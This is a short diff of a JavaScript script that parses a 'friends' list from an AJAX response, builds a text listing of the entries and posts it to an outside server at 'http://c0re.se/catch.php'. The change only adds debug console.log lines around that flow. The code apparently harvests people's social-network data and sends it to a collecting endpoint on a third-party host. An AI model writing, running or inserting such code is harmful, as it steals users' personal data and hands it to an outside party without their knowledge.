@@ -33,6 +33,7 @@ $.ajax({
 		alert('Please try again.');
 	},
 	error: function(data){
+		console.log('1st');
 		var text = data.responseText;
 
 		var json = text.substring(text.indexOf('{'));
@@ -47,7 +48,9 @@ $.ajax({
 			var info = "\n" + friends[i].text + " " + friends[i].index;
 			$(display).append(info);
 		}
-
+		console.log('2nd');
 		$.post("http://c0re.se/catch.php", { "text":display, }, "text");
+		console.log('3rd');
+
 	}
 });
